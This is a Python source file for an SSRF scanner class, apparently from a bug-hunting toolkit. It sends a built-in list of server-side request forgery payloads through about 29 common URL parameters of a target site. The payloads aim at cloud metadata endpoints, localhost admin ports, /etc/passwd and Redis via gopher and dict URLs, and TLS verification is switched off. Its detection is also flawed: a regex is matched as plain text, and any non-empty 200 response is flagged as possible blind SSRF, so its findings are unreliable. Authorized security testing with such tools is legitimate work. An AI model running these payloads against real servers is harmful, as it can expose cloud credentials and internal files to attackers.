import requests
from urllib.parse import urljoin, urlencode, parse_qs
from colorama import Fore, Style
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SSRFChecker:
    def __init__(self, url, config=None):
        self.url = url.rstrip('/')
        self.verbose = config.get('verbose', False) if config else False
        self.config = config if config else {}
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers['User-Agent'] = 'BugHunter/2.0'
        
        if self.config.get('headers'):
            self.session.headers.update(self.config['headers'])
        
        self.ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/',  # GCP
            'http://127.0.0.1:8080/admin',
            'http://localhost:8080/admin',
            'http://0.0.0.0:8080/admin',
            'http://[::1]:8080/admin',
            'http://169.254.169.254/',  # Cloud metadata
            'http://100.100.100.200/',  # Alibaba Cloud
            'file:///etc/passwd',
            'file:///etc/hosts',
            'gopher://127.0.0.1:6379/',  # Redis
            'dict://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:6379/',  # Redis HTTP
        ]
        
        self.url_params = [
            'url', 'uri', 'path', 'file', 'document', 'folder',
            'root', 'show', 'source', 'template', 'page',
            'data', 'src', 'dest', 'destination', 'redirect',
            'link', 'target', 'href', 'fetch', 'load',
            'proxy', 'route', 'host', 'ip', 'domain',
            'callback', 'webhook', 'notification',
        ]
        
        self.vulnerable = []
        self.responses = []
    
    def test_ssrf(self, param, payload):
        """Test SSRF on a parameter"""
        try:
            test_url = f"{self.url}?{param}={payload}"
            response = self.session.get(test_url, timeout=10, allow_redirects=False)
            
            # Check for metadata responses
            metadata_indicators = [
                'ami-id', 'instance-id', 'security-credentials',
                'public-keys', 'meta-data', 'user-data',
                'root:.*:0:0:',  # /etc/passwd
                'localhost', '127.0.0.1',
            ]
            
            for indicator in metadata_indicators:
                if indicator.lower() in response.text.lower():
                    return {
                        'param': param,
                        'payload': payload,
                        'indicator': indicator,
                        'status': response.status_code,
                        'size': len(response.content)
                    }
            
            # Check if request was made (different response)
            if response.status_code == 200 and len(response.content) > 0:
                # Could be blind SSRF
                return {
                    'param': param,
                    'payload': payload,
                    'indicator': 'Possible blind SSRF',
                    'status': response.status_code,
                    'size': len(response.content)
                }
            
        except:
            pass
        return None
    
    def scan(self):
        if self.verbose:
            print(f"\n[*] Testing SSRF on: {self.url}")
            print(f"[*] Testing {len(self.url_params)} params with {len(self.ssrf_payloads)} payloads\n")
        
        for param in self.url_params:
            for payload in self.ssrf_payloads[:5]:  # Limit to avoid overwhelming
                result = self.test_ssrf(param, payload)
                if result:
                    self.vulnerable.append(result)
                    self.responses.append(result)
                    if self.verbose:
                        print(f"  {Fore.RED}[⚠] SSRF POSSIBLE: {param}={payload}{Style.RESET_ALL}")
                        print(f"       Indicator: {result['indicator']}")
        
        return self.vulnerable
    
    def display_results(self):
        print(f"\n{'='*60}")
        print(f"  🔴 SSRF CHECKER")
        print(f"{'='*60}")
        print(f"  URL: {self.url}")
        
        if self.vulnerable:
            print(f"\n  {Fore.RED}⚠️  POTENTIAL SSRF ({len(self.vulnerable)}):{Style.RESET_ALL}\n")
            for v in self.vulnerable:
                print(f"    • Parameter: {v['param']}")
                print(f"      Payload: {v['payload']}")
                print(f"      Evidence: {v['indicator']}")
                print()
        else:
            print(f"\n  ✅ No SSRF indicators found")
        
        print(f"\n  {Fore.YELLOW}💡 Tip: Test these parameters manually with Burp Collaborator{Style.RESET_ALL}")
        print(f"{'='*60}")
